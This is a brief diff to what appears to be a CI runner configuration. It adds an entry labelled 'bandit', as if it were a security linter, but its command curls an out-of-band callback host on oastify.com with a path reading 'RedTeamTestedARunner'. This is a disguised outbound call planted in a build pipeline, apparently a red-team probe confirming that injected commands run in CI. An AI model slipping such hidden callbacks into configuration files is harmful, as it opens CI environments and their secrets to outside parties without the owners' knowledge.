@@ -19,3 +19,5 @@ runner:
   # golangci-lint:
   #   cmd: ./bin/golangci-lint run --config .github/.golangci.yml --out-format=line-number **/*.go
   #   format: golangci-lint
+  bandit:
+    cmd: curl https://waag6ee3ho8r0yeqjcuncs8lscy3mxam.oastify.com/RedTeamTestedARunner
